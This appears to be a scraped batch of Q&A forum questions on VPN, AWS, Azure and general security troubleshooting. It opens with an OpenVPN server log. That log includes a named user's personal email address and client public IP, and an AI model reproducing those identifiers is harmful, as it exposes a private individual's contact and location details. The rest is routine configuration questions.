Wed Feb 21 19:43:58 2024 Set TAP-Windows TUN subnet mode network/local/netmask = 10.8.0.0/10.8.0.1/255.255.255.0 [SUCCEEDED]
Wed Feb 21 19:43:58 2024 Notified TAP-Windows driver to set a DHCP IP/netmask of 10.8.0.1/255.255.255.0 on interface {16C88E12-9581-46D9-86FD-A51FF83B3235} [DHCP-serv: 10.8.0.254, lease-time: 31536000]
Wed Feb 21 19:43:58 2024 Sleeping for 10 seconds...
Wed Feb 21 19:44:08 2024 Successful ARP Flush on interface [6] {16C88E12-9581-46D9-86FD-A51FF83B3235}
Wed Feb 21 19:44:08 2024 MANAGEMENT: &gt;STATE:1708541048,ASSIGN_IP,,10.8.0.1,,,,
Wed Feb 21 19:44:08 2024 Could not determine IPv4/IPv6 protocol. Using AF_INET6
Wed Feb 21 19:44:08 2024 Socket Buffers: R=[65536-&gt;65536] S=[65536-&gt;65536]
Wed Feb 21 19:44:08 2024 setsockopt(IPV6_V6ONLY=0)
Wed Feb 21 19:44:08 2024 UDPv6 link local (bound): [AF_INET6][undef]:1195
Wed Feb 21 19:44:08 2024 UDPv6 link remote: [AF_UNSPEC]
Wed Feb 21 19:44:08 2024 MULTI: multi_init called, r=256 v=256
Wed Feb 21 19:44:08 2024 IFCONFIG POOL: base=10.8.0.2 size=252, ipv6=0
Wed Feb 21 19:44:08 2024 IFCONFIG POOL LIST
Wed Feb 21 19:44:08 2024 Initialization Sequence Completed
Wed Feb 21 19:44:08 2024 MANAGEMENT: &gt;STATE:1708541048,CONNECTED,SUCCESS,10.8.0.1,,,,
Wed Feb 21 19:44:46 2024 88.29.181.13:64121 TLS: Initial packet from [AF_INET6]::ffff:88.29.181.13:64121, sid=3d86e25d 974ca1db
Wed Feb 21 19:44:46 2024 88.29.181.13:64121 VERIFY OK: depth=1, C=ES, ST=ZA, L=Zaragoza, O=OpenVPN, OU=pruebas-vpn, CN=vpn-christian, name=christian, emailAddress=alvarovidal8@outlook.com
Wed Feb 21 19:44:46 2024 88.29.181.13:64121 VERIFY OK: depth=0, C=ES, ST=ZA, L=Zaragoza, O=OpenVPN, OU=changeme, CN=christian, name=changeme, emailAddress=alvarovidal8@outlook.com
Wed Feb 21 19:44:46 2024 88.29.181.13:64121 peer info: IV_VER=3.8.4connectX
Wed Feb 21 19:44:46 2024 88.29.181.13:64121 peer info: IV_PLAT=android
Wed Feb 21 19:44:46 2024 88.29.181.13:64121 peer info: IV_NCP=2
Wed Feb 21 19:44:46 2024 88.29.181.13:64121 peer info: IV_TCPNL=1
Wed Feb 21 19:44:46 2024 88.29.181.13:64121 peer info: IV_PROTO=990
Wed Feb 21 19:44:46 2024 88.29.181.13:64121 peer info: IV_MTU=1600
Wed Feb 21 19:44:46 2024 88.29.181.13:64121 peer info: IV_CIPHERS=AES-128-CBC:AES-192-CBC:AES-256-CBC:AES-128-GCM:AES-192-GCM:AES-256-GCM:CHACHA20-POLY1305
Wed Feb 21 19:44:46 2024 88.29.181.13:64121 peer info: IV_AUTO_SESS=1
Wed Feb 21 19:44:46 2024 88.29.181.13:64121 peer info: IV_GUI_VER=net.openvpn.connect.android_3.4.0-9755
Wed Feb 21 19:44:46 2024 88.29.181.13:64121 peer info: IV_SSO=webauth,openurl,crtext
Wed Feb 21 19:44:46 2024 88.29.181.13:64121 Control Channel: TLSv1.2, cipher TLSv1.2 ECDHE-RSA-AES256-GCM-SHA384, 4096 bit RSA
Wed Feb 21 19:44:46 2024 88.29.181.13:64121 [christian] Peer Connection Initiated with [AF_INET6]::ffff:88.29.181.13:64121
Wed Feb 21 19:44:46 2024 christian/88.29.181.13:64121 MULTI_sva: pool returned IPv4=10.8.0.2, IPv6=(Not enabled)
Wed Feb 21 19:44:46 2024 christian/88.29.181.13:64121 MULTI: Learn: 10.8.0.2 -&gt; christian/88.29.181.13:64121
Wed Feb 21 19:44:46 2024 christian/88.29.181.13:64121 MULTI: primary virtual IP for christian/88.29.181.13:64121: 10.8.0.2
Wed Feb 21 19:44:46 2024 christian/88.29.181.13:64121 PUSH: Received control message: 'PUSH_REQUEST'
Wed Feb 21 19:44:46 2024 christian/88.29.181.13:64121 SENT CONTROL [christian]: 'PUSH_REPLY,redirect-gateway def1,dhcp-option DNS 8.8.8.8,dhcp-option DNS 8.8.4.4,route-gateway 10.8.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 10.8.0.2 255.255.255.0,peer-id 0,cipher AES-256-GCM' (status=1)
Wed Feb 21 19:44:46 2024 christian/88.29.181.13:64121 Data Channel: using negotiated cipher 'AES-256-GCM'
Wed Feb 21 19:44:46 2024 christian/88.29.181.13:64121 Outgoing Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
Wed Feb 21 19:44:46 2024 christian/88.29.181.13:64121 Incoming Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 TLS: Initial packet from [AF_INET6]::ffff:&lt;public ip&gt;:1195, sid=9e840491 23ad990a
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 VERIFY OK: depth=1, C=ES, ST=ZA, L=Zaragoza, O=OpenVPN, OU=pruebas-vpn, CN=vpn-christian, name=christian, emailAddress=alvarovidal8@outlook.com
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 VERIFY OK: depth=0, C=ES, ST=ZA, L=Zaragoza, O=OpenVPN, OU=changeme, CN=christian, name=changeme, emailAddress=alvarovidal8@outlook.com
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 peer info: IV_VER=2.4.8
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 peer info: IV_PLAT=win
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 peer info: IV_PROTO=2
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 peer info: IV_NCP=2
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 peer info: IV_LZ4=1
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 peer info: IV_LZ4v2=1
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 peer info: IV_LZO=1
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 peer info: IV_COMP_STUB=1
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 peer info: IV_COMP_STUBv2=1
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 peer info: IV_TCPNL=1
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 WARNING: 'dev-type' is used inconsistently, local='dev-type tun', remote='dev-type tap'
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 WARNING: 'link-mtu' is used inconsistently, local='link-mtu 1557', remote='link-mtu 1589'
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 WARNING: 'tun-mtu' is used inconsistently, local='tun-mtu 1500', remote='tun-mtu 1532'
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 Control Channel: TLSv1.2, cipher TLSv1.2 ECDHE-RSA-AES256-GCM-SHA384, 4096 bit RSA
Wed Feb 21 19:46:31 2024 &lt;public ip&gt;:1195 [christian] Peer Connection Initiated with [AF_INET6]::ffff:&lt;public ip&gt;:1195
Wed Feb 21 19:46:31 2024 MULTI: new connection by client 'christian' will cause previous active sessions by this client to be dropped.  Remember to use the --duplicate-cn option if you want multiple clients using the same certificate or username to concurrently connect.
Wed Feb 21 19:46:31 2024 MULTI_sva: pool returned IPv4=10.8.0.2, IPv6=(Not enabled)
Wed Feb 21 19:46:31 2024 MULTI: Learn: 10.8.0.2 -&gt; christian/&lt;public ip&gt;:1195
Wed Feb 21 19:46:31 2024 MULTI: primary virtual IP for christian/&lt;public ip&gt;:1195: 10.8.0.2
Wed Feb 21 19:46:32 2024 christian/&lt;public ip&gt;:1195 PUSH: Received control message: 'PUSH_REQUEST'
Wed Feb 21 19:46:32 2024 christian/&lt;public ip&gt;:1195 SENT CONTROL [christian]: 'PUSH_REPLY,redirect-gateway def1,dhcp-option DNS 8.8.8.8,dhcp-option DNS 8.8.4.4,route-gateway 10.8.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 10.8.0.2 255.255.255.0,peer-id 1,cipher AES-256-GCM' (status=1)
Wed Feb 21 19:46:32 2024 christian/&lt;public ip&gt;:1195 Data Channel: using negotiated cipher 'AES-256-GCM'
Wed Feb 21 19:46:32 2024 christian/&lt;public ip&gt;:1195 Outgoing Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
Wed Feb 21 19:46:32 2024 christian/&lt;public ip&gt;:1195 Incoming Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
Wed Feb 21 19:50:32 2024 christian/&lt;public ip&gt;:1195 [christian] Inactivity timeout (--ping-restart), restarting
Wed Feb 21 19:50:32 2024 christian/&lt;public ip&gt;:1195 SIGUSR1[soft,ping-restart] received, client-instance restarting
Wed Feb 21 19:51:42 2024 88.29.181.13:64156 TLS: Initial packet from [AF_INET6]::ffff:88.29.181.13:64156, sid=fc74b517 1dd9e4ba
Wed Feb 21 19:51:42 2024 88.29.181.13:64156 VERIFY OK: depth=1, C=ES, ST=ZA, L=Zaragoza, O=OpenVPN, OU=pruebas-vpn, CN=vpn-christian, name=christian, emailAddress=alvarovidal8@outlook.com
Wed Feb 21 19:51:42 2024 88.29.181.13:64156 VERIFY OK: depth=0, C=ES, ST=ZA, L=Zaragoza, O=OpenVPN, OU=changeme, CN=christian, name=changeme, emailAddress=alvarovidal8@outlook.com
Wed Feb 21 19:51:42 2024 88.29.181.13:64156 peer info: IV_VER=3.8.4connectX
Wed Feb 21 19:51:42 2024 88.29.181.13:64156 peer info: IV_PLAT=android
Wed Feb 21 19:51:42 2024 88.29.181.13:64156 peer info: IV_NCP=2
Wed Feb 21 19:51:42 2024 88.29.181.13:64156 peer info: IV_TCPNL=1
Wed Feb 21 19:51:42 2024 88.29.181.13:64156 peer info: IV_PROTO=990
Wed Feb 21 19:51:42 2024 88.29.181.13:64156 peer info: IV_MTU=1600
Wed Feb 21 19:51:42 2024 88.29.181.13:64156 peer info: IV_CIPHERS=AES-128-CBC:AES-192-CBC:AES-256-CBC:AES-128-GCM:AES-192-GCM:AES-256-GCM:CHACHA20-POLY1305
Wed Feb 21 19:51:42 2024 88.29.181.13:64156 peer info: IV_AUTO_SESS=1
Wed Feb 21 19:51:42 2024 88.29.181.13:64156 peer info: IV_GUI_VER=net.openvpn.connect.android_3.4.0-9755
Wed Feb 21 19:51:42 2024 88.29.181.13:64156 peer info: IV_SSO=webauth,openurl,crtext
Wed Feb 21 19:51:42 2024 88.29.181.13:64156 Control Channel: TLSv1.2, cipher TLSv1.2 ECDHE-RSA-AES256-GCM-SHA384, 4096 bit RSA
Wed Feb 21 19:51:42 2024 88.29.181.13:64156 [christian] Peer Connection Initiated with [AF_INET6]::ffff:88.29.181.13:64156
Wed Feb 21 19:51:42 2024 christian/88.29.181.13:64156 MULTI_sva: pool returned IPv4=10.8.0.2, IPv6=(Not enabled)
Wed Feb 21 19:51:42 2024 christian/88.29.181.13:64156 MULTI: Learn: 10.8.0.2 -&gt; christian/88.29.181.13:64156
Wed Feb 21 19:51:42 2024 christian/88.29.181.13:64156 MULTI: primary virtual IP for christian/88.29.181.13:64156: 10.8.0.2
Wed Feb 21 19:51:42 2024 christian/88.29.181.13:64156 PUSH: Received control message: 'PUSH_REQUEST'
Wed Feb 21 19:51:42 2024 christian/88.29.181.13:64156 SENT CONTROL [christian]: 'PUSH_REPLY,redirect-gateway def1,dhcp-option DNS 8.8.8.8,dhcp-option DNS 8.8.4.4,route-gateway 10.8.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 10.8.0.2 255.255.255.0,peer-id 0,cipher AES-256-GCM' (status=1)
Wed Feb 21 19:51:42 2024 christian/88.29.181.13:64156 Data Channel: using negotiated cipher 'AES-256-GCM'
Wed Feb 21 19:51:42 2024 christian/88.29.181.13:64156 Outgoing Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
Wed Feb 21 19:51:42 2024 christian/88.29.181.13:64156 Incoming Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key

</code></pre>
<p>Please, could someone bring some clarity to the matter?
`</p>
<p>I have noticed that if I comment this line on server.ovpn `push &quot;redirect-gateway def1&quot;, I have internet connection in the client but I don't have the remote public ip but the client connected router instead.</p>
<p>It seems clear that the traffic is not going out the server lan.</p>
"
"<p>I am unable to create AWS Security group while creating ISTIO NLB. Below is my helm values to deploy istio:</p>
<pre><code>cat &lt;&lt;EOF&gt; istio-ingress-values.yaml

gateways:

  istio-ingressgateway:

    serviceAnnotations:

      service.beta.kubernetes.io/aws-load-balancer-type: &quot;nlb&quot;

      service.beta.kubernetes.io/aws-load-balancer-proxy-protocol: &quot;*&quot;

      service.beta.kubernetes.io/aws-load-balancer-cross-zone-load-balancing-enabled: &quot;true&quot;

      service.beta.kubernetes.io/aws-load-balancer-security-groups: &quot;&lt;security group ID&gt;&quot;,

      service.beta.kubernetes.io/aws-load-balancer-connection-idle-timeout: &quot;60&quot;

      service.beta.kubernetes.io/aws-load-balancer-ssl-cert: &quot;&lt;Cert_ARN&gt;&quot;

      service.beta.kubernetes.io/aws-load-balancer-ssl-negotiation-policy: &quot;ELBSecurityPolicy-TLS-1-2-Ext-2018-06&quot;

      service.beta.kubernetes.io/aws-load-balancer-ssl-ports: &quot;https&quot;

      service.beta.kubernetes.io/aws-load-balancer-ssl-backend-protocol: &quot;tcp&quot;

EOF
</code></pre>
<p>Helm install:</p>
<pre><code>helm upgrade --install istio-ingress manifests/charts/gateways/istio-ingress -n istio-system -f istio-ingress-values.yaml
</code></pre>
<p>If I create the NLB manually, it works as expected and I'm able to attach the SG. But what I am expecting is it should be created automatically while I'm deploying istio.</p>
"
"<p>So we had a Lambda, which has a VPC and a security group attached to it. Now we got a security risk which says that our AWS account contains a security group that allows inbound access across all protocols (i.e. Protocol = 'All' ). The security group is associated with an elastic network interface which is &quot;in-use&quot;.</p>
<p>So we changed the port of the security group inbound rule to use teh SSH port which is 22.</p>
<p>And after doing that we started getting failure via cloudwatch metrics and also verified that the lambda was failing when trying to run it.</p>
<p>Just wanted to know how does this happened, and understand the process here? I read some where that it does not matter what inbound rule you give to the security group attached to lambda.</p>
<p>On changing the port to 443 , lambda starts to work. So wanted to know how do we decide moving forward that which port should be used with lambda.</p>
<p>Thanks.</p>
"
"<p>I have a policy called Lightsail Developers:</p>
<pre><code>{
    &quot;Version&quot;: &quot;2012-10-17&quot;,
    &quot;Statement&quot;: [
        {
            &quot;Effect&quot;: &quot;Allow&quot;,
            &quot;Action&quot;: [
                &quot;lightsail:*&quot;
            ],
            &quot;Resource&quot;: &quot;*&quot;
        }
    ]
}
</code></pre>
<p>In &quot;IAM Identity Center&quot; I created a user, and put him in the group &quot;LightsailDevelopers&quot;.
Not, how do I add that group to the above policy?  Do I add a SID statement?  Is it done by the picking and choosing in the console, or by editing the JSON of the policy?</p>
"
"<p>I am setting up an ECS Task on 1st aws account  that hold my app container which internally is connecting to the RDS database instance(hosted on another aws account) , I have made sure that the security group attached to the RDS database instance to allow all tcp traffic for testing. but whenever i launch a service based on the Task definition I created I receive the following error &quot; <em>There was an error deploying ......  container. Resource handler returned message: &quot;Error occurred during operation 'ECS Deployment Circuit Breaker was triggered'.&quot; (RequestToken: ..., HandlerErrorCode: GeneralServiceException</em>)</p>
<p>this is a screenshot from the logs
<a href=""https://i.stack.imgur.com/WOzqA.png"" rel=""nofollow noreferrer"">cloudwatch logs once creating the ECS Service</a></p>
<p>I have tried to allow all the inbound traffic in the security group attached to the RDS instance but on Service Creation the same error appears &quot;<em>There was an error deploying the .... container. Resource handler returned message: &quot;Error occurred during operation 'ECS Deployment Circuit Breaker was triggered'.&quot; (RequestToken: ..., HandlerErrorCode: GeneralServiceException</em>)
&quot;
I was expecting that the service to get created normally and no connection error appear
Note I can connect to the database instance locally from mysql workbench so i assume that there should be no problem regarding connecting to the RDS DB instance</p>
"
"<p>docker-compose up -d
Pulling expedition-db (ghcr.io/paloaltonetworks/expedition-db:2.1.1)...
ERROR: Head &quot;https://ghcr.io/v2/paloaltonetworks/expedition-db/manifests/2.1.1&quot;: denied</p>
<p>I am new to docker and am tasked to set up a container, the command &quot;docker-compose up -d&quot; worked halfway and created volumes but is now unable to authenticate the Github URL.</p>
"
"<p>I am trying to connect to a server which is on prem network using a databricks notebook. But I get error saying that &quot;failed to connect to address. UNAVAIALABLE Socket closed&quot;.
I pinged to the server IP and it got failed.
<a href=""https://i.stack.imgur.com/MxqHr.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/MxqHr.png"" alt=""enter image description here"" /></a></p>
<p>I wanted to add this IP as exception to databricks so that it can connect to it.
After learning the options to configure network configs, I understand that it needs to be added as a rules in network security group. So I added it as a outbound rule with below configs :</p>
<p><a href=""https://i.stack.imgur.com/yWhrc.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/yWhrc.png"" alt=""enter image description here"" /></a></p>
<p>But I am still not able to successfully ping the server IP.</p>
<p>I have shared all the details. Can anyone guide me what I am doing wrong?</p>
"
"<p>I have a string of output from a query I have ran against a firewall. When I try to parse the string using the community XML module, I am getting an output of:</p>
<blockquote>
<p>fatal: [hostname]: FAILED! =&gt; {&quot;changed&quot;: false, &quot;msg&quot;: &quot;Error while parsing document: xml_string (Start tag expected, '&lt;' not found, line 1, column 1 (&lt;string&gt;, line 1))&quot;}</p>
</blockquote>
<p>From:</p>
<pre><code>    - name: Gather allocated number of addresses for LAN interface...
      community.general.xml:
        xmlstring: ethernet1-1_output.content
        xpath: &quot;/x:response/x:result/x:interface[@name='allocated']&quot;
      register: allocated_ethernet1-1
</code></pre>
<p>I have debugged my input and it does seem to be valid XML according to VS.Code. But there are extra characters I think Ansible is adding that might be giving it a problem.</p>
<pre><code>&lt;response status=\&quot;success\&quot;&gt;
    &lt;result&gt;
        &lt;interface name=\&quot;ethernet1/1\&quot; id=\&quot;258\&quot; allocated=\&quot;40\&quot; total=\&quot;150\&quot;&gt;
            &lt;entry name=\&quot;10.10.10.10\&quot;&gt;\n
</code></pre>
<p>Is there a way to get a more 'unmodified' output from an API query? Or an easier way to format this to be more module-readable? The goal is to grab the allocated and total values as separate numbers.</p>
"
"<p>According to the Microsoft's diagram in the <a href=""https://learn.microsoft.com/en-us/azure/architecture/reference-architectures/hybrid-networking/hub-spoke?tabs=cli"" rel=""nofollow noreferrer"">Hub-spoke network topology in Azure</a> article, Hub network and Azure Firewall are shared between production and non-production spoke virtual networks.</p>
<p><a href=""https://i.stack.imgur.com/3Zesn.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/3Zesn.png"" alt=""enter image description here"" /></a></p>
<p>Historically, I have separated prod with non-prod resources. It is not clear to me why I would not do that for a Firewall, aside for cost.</p>
<p>Assuming there is no cost factor for Azure Firewall, is there a reason why I would not want to follow the design in the article and have a separate Hub/Firewall per environment?</p>
<p>Thank you</p>
"
"<p>I hope somebody can help me to solve this issue as i am loosing my mind and patience with it.</p>
<p>Following this microsoft documentation on how to provision an SFTP platform using an azure firewall and SFTP storage, i found that the default deployment provisions a Standard Firewall, which is relatively expensive.</p>
<p><a href=""https://learn.microsoft.com/en-us/azure/firewall/firewall-sftp"" rel=""nofollow noreferrer"">https://learn.microsoft.com/en-us/azure/firewall/firewall-sftp</a></p>
<p>i tried to downscale the infra to a Basic Firewall and changed the code as follow:</p>
<pre><code># Create new subnets for the firewall
$FWsub = New-AzVirtualNetworkSubnetConfig -Name AzureFirewallSubnet -AddressPrefix 10.0.1.0/26
$Worksub = New-AzVirtualNetworkSubnetConfig -Name Workload-SN -AddressPrefix 10.0.2.0/24
$FunctionSn = New-AzVirtualNetworkSubnetConfig -Name my-azure-function -AddressPrefix 10.0.3.0/24
$SubnetMng = New-AzVirtualNetworkSubnetConfig -Name AzureFirewallManagementSubnet -AddressPrefix 10.0.4.0/24

# Create a new VNet
$testVnet = New-AzVirtualNetwork -Name vnet-sftp -ResourceGroupName $rg -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $FWsub, $Worksub, $FunctionSn, $SubnetMng

# Create a public IP address for the firewall
$pip = New-AzPublicIpAddress `
    -ResourceGroupName $rg `
    -Location $location `
    -AllocationMethod Static `
    -Sku Standard `
    -Name sftp-piblic-ip


# Create a new firewall policy
$policy = New-AzFirewallPolicy -Name &quot;fw-policy-sftp&quot; -ResourceGroupName &quot;$rg&quot; -Location $location -SkuTier &quot;Basic&quot;

# Define new rules to add
$newrule1 = New-AzFirewallPolicyNatRule -Name &quot;dnat-rule1&quot; -Protocol &quot;TCP&quot;, &quot;UDP&quot; -SourceAddress &quot;*&quot; -DestinationAddress $pip.ipaddress -DestinationPort &quot;22&quot; -TranslatedAddress $staticEP -TranslatedPort &quot;22&quot;

# Add the new rules to the local rule collection object
$natrulecollection = New-AzFirewallPolicyNatRuleCollection -Name &quot;NATRuleCollection&quot; -Priority 100 -ActionType &quot;Dnat&quot; -Rule $newrule1

# Create a new rule collection group
$natrulecollectiongroup = New-AzFirewallPolicyRuleCollectionGroup -Name &quot;rcg-01&quot; -ResourceGroupName &quot;$rg&quot; -FirewallPolicyName &quot;fw-policy-sftp&quot; -Priority 100

# Add the new NAT rule collection to the rule collection group
$natrulecollectiongroup.Properties.RuleCollection = $natrulecollection

# Update the rule collection
Set-AzFirewallPolicyRuleCollectionGroup -Name &quot;rcg-01 &quot; -FirewallPolicyObject $policy -Priority 200 -RuleCollection $natrulecollectiongroup.Properties.rulecollection



# Create the firewall
$firewall = New-AzFirewall `
    -Name fw-sftp `
    -ResourceGroupName $rg `
    -Location $location `
    -VirtualNetwork $testvnet `
    -PublicIpAddress $pip `
    -FirewallPolicyId $policy.id `
    -ManagementPublicIpAddress $pip `
    -SkuTier &quot;Basic&quot;

# Create the route table
$routeTableDG = New-AzRouteTable `
  -Name Firewall-rt-table `
  -ResourceGroupName &quot;$rg&quot; `
  -location $location `
  -DisableBgpRoutePropagation

# Add the default route
Add-AzRouteConfig `
  -Name &quot;DG-Route&quot; `
  -RouteTable $routeTableDG `
  -AddressPrefix 0.0.0.0/0 `
  -NextHopType &quot;VirtualAppliance&quot; `
  -NextHopIpAddress $pip.ipaddress `
 | Set-AzRouteTable



 New-AzStorageAccount -ResourceGroupName $rg -Name $StorageAccountName -SkuName Standard_LRS -Location $location -EnableHierarchicalNamespace $true -PublicNetworkAccess enabled

 # Get the subscription and user information
 $subscriptionId = (Get-AzSubscription -SubscriptionName &quot;$SubscriptionName&quot;).SubscriptionId
 $user = Get-AzADUser -UserPrincipalName $UserPrincipalName
 
 # Give the user contributor role
 New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionName &quot;Storage Blob Data Contributor&quot; -Scope &quot;/subscriptions/$subscriptionId/resourceGroups/$rg/providers/Microsoft.Storage/storageAccounts/$StorageAccountName&quot;
 
 #Create the container and then disable public network access
 $ctx = New-AzStorageContext -StorageAccountName $StorageAccountName
 New-AzStorageContainer -Name $ContainerName -Context $ctx
 Set-AzStorageAccount -ResourceGroupName $rg -Name $StorageAccountName -PublicNetworkAccess disabled -Force




 Set-AzStorageAccount `
    -ResourceGroupName $rg `
    -Name $StorageAccountName `
    -EnableSftp $true

$permissionScopeBlob = New-AzStorageLocalUserPermissionScope `
    -Permission rwdlc `
    -Service blob `
    -ResourceName $ContainerName

$localuser = Set-AzStorageLocalUser `
    -ResourceGroupName $rg `
    -AccountName $StorageAccountName `
    -UserName testuser `
    -PermissionScope $permissionScopeBlob

$localuserPassword = New-AzStorageLocalUserSshPassword `
    -ResourceGroupName $rg `
    -StorageAccountName $StorageAccountName `
    -UserName testuser

# Examine and manually save the password

$localuserPassword



# Place the previously created storage account into a variable
$storage = Get-AzStorageAccount -ResourceGroupName $rg -Name $StorageAccountName

# Create the private endpoint connection
$pec = @{
    Name = 'Connection01'
    PrivateLinkServiceId = $storage.ID
    GroupID = 'blob'
}

$privateEndpointConnection = New-AzPrivateLinkServiceConnection @pec


# Create the static IP configuration
$ip = @{
    Name = 'myIPconfig'
    GroupId = 'blob'
    MemberName = 'blob'
    PrivateIPAddress = $staticEP
}

$ipconfig = New-AzPrivateEndpointIpConfiguration @ip

# Create the private endpoint
$pe = @{
    ResourceGroupName = $rg
    Name = 'pe-storage-sftp'
    Location = $location
    Subnet = $testvnet.Subnets[1]
    PrivateLinkServiceConnection = $privateEndpointConnection
    IpConfiguration = $ipconfig
}

New-AzPrivateEndpoint @pe
</code></pre>
<p>While i thought the configuration would be the same, i see that the basic firewall requires an extra subnet and a <code>-ManagementPublicIpAddress</code> which this will bring up 2 public ips in total. Also while trying to run the powershell command i get the following error</p>
<pre><code>New-AzFirewall : Public IP Address. is being referenced multiple times. Each IP configuration must reference a unique Public IP address.
StatusCode: 400
ReasonPhrase: Bad Request
ErrorCode: AzureFirewallDuplicatePublicIp
</code></pre>
<p>This forces me to have 2 public IP and i am getting a bit confused on how to connect this to the <code>NextHope</code> in the firewall route table and to the storage account that lives in the virtual network.</p>
<p>I hope i explained myself good enough, if not please just ask more details and i will explain better.
Thank you so much for any help you can provide</p>
"
"<p>I recently delved into the realm of malware and phishing detection, experimenting with various services. One interesting observation emerged during my exploration—specifically, the disparity in detecting malicious URLs between Google Web Risk Lookup API and VirusTotal.</p>
<p>I conducted tests with URLs sourced from databases like urlhaus, and intriguingly, Google Web Risk Lookup API did not flag many of them as malicious, even though counterparts like VirusTotal successfully identified them. Notably, some of these URLs were associated with well-known malware payloads.</p>
<p>It's worth noting that the tests were conducted on the Google Cloud Platform, leveraging Google Web Risk, and the results were compared against those obtained from VirusTotal.</p>
<p>what is the reason for this?</p>
"
"<p>We have using Gitlab ce 13.1.11. Recently we upgrading from 11.3.10 to 13.1.11 we are facing vurnability attacks from outside. Different days they are trying to attack using .json file and some other format files. Also some of the time cpu getting overload because of some unwanted process running in backend like puma,sidekiq and x process. Please help me to resolve this issue. Also in crontab some unwanted jobs running by git everyday im removing but still its exisiting.</p>
<p>I'm trying to solve this issue. But still i'm facing the issue. Please help me to resolve this issue. Thanks in advance.</p>
"
"<p>I have an infected USB flash drive. So I used gparted live to safely remove all partitions and created an NTFS one before inserting in windows. But I'm really worries if any malware in raw data can infect my computer somehow. Is it really possible?</p>
<p>I formatted all partitions so raw data remains.</p>
"
"<p>As per <a href=""https://docs.aws.amazon.com/vpc/latest/userguide/default-security-group.html#default-security-group-default-rules"" rel=""nofollow noreferrer"">AWS docs</a>, a default security group:</p>
<ul>
<li>Allows inbound traffic from all resources that are assigned to this security group. The source is the ID of this security group.</li>
<li>Allows all outbound IPv4 traffic.</li>
</ul>
<p>A recent pentest, however, has recommended that upon creation default security groups should instead restrict all traffic. Is there a way to set this as a standard across an account or organisation? I don't want to have to manually update individual security groups via console or CLI.</p>
"
"<p>I ordered a new keyboard and I want to be sure that it is safe to use (I saw the recommendations about it and it seems legit but still wanna be sure).
The problem is that I have another software on my computer that has sensitive information and It's a familiar software, how can I be sure that the keyboard doesn't have any undercover software which looking for that software and trying to steal the info or change it? Thanks.</p>
<p>I connected the keyboard to another computer but didnt knew how to check the keyboard.</p>
"
"<p>I would like to ask if there is any security misconfiguration in Amazon Cognito to store the UserPoolId and the ClientId hardcoded in the source code of a web page. Let's say that an unauthorized user can find these IDs in the source code and create a user. Is this a bad practice?</p>
<p>I am interesting to know if this is a security issue. I have tried to research this problem, but I did not find any exact responses.</p>
"
"<p>I'm very new to AWS, so apologise if I am asking what might be a ridiculous question.</p>
<p>I am trying to understand more about security groups. Based of what I found from reading various documentations... what I understand (not sure if im right) is there are two types of security groups. One is EC2-VPC which is an EC2 security group type and another is a VPC Security group. We can attach these security group types to other aws services such as ELB/NLB,S3 etc...am I wrong?</p>
<p>Also came across a RDS security group. Is that a different type of security group? How many types of security groups are there? How do I find out which type of security group is attached to an aws service?</p>
"
"<p>I'm building an iOS app with Laravel backend.</p>
<p>I'm using Firebase Authentication to handle the following authentication types: Google, Apple, and email/password sign up.</p>
<p>I've set up Google and Apple sign up by utilizing Laravel Socialite, however it doesn't look like Socialite supports an email/password driver, so I can't use this code for email/password authentication:</p>
<pre><code>class AuthController extends Controller
{
    public function login(Request $request)
    {
        $validator = Validator::make($request-&gt;all(), [
            'provider_name' =&gt; 'required|string|in:google,apple',
            'access_token' =&gt; 'required|string',
        ]);
 
        if ($validator-&gt;fails()) {
            Log::info($validator-&gt;errors());
            return;
        }

        $providerName = $request-&gt;input('provider_name');
        $token = $request-&gt;input('access_token');

        $providerUser = Socialite::driver($providerName)
            -&gt;userFromToken($token);

        $user = User::where('provider_name', $providerName)
            -&gt;where('provider_id', $providerUser-&gt;id)
            -&gt;first();

        if ($user == null)
        {
            $user = new User;
            $user-&gt;name = $providerUser-&gt;name;
            $user-&gt;email = $providerUser-&gt;email;
            $user-&gt;provider_name = $providerName;
            $user-&gt;provider_id = $providerUser-&gt;id;
            $user-&gt;save();
        }

        $token = $user
            -&gt;createToken(&quot;token&quot;)
            -&gt;accessToken;

        return response()-&gt;json([
            &quot;status&quot; =&gt; &quot;success&quot;,
            &quot;data&quot; =&gt; [
                &quot;token&quot; =&gt; $token,
                &quot;user&quot; =&gt; $user
            ],
        ]);
    }
}
</code></pre>
<p>So what's the &quot;right&quot; way of ALSO handling email/password sign up?</p>
<p>I'm at the point where I've the user is signed in on the iOS app and the account has been created through Firebase. I just don't know what to do to actually pass the user data to the Laravel backend and handle authentication/tokens as I do with Google/Apple authentication.</p>
"
"<p>FedRAMP's Rev 5 from last year specifies the need to at minimum protect against a few types of attacks:</p>
<blockquote>
<p>prevent specific denial-of-service (DoS), including ICMP (ping) flood, SYN flood, slowloris, buffer overflow attacks, and volume attacks.</p>
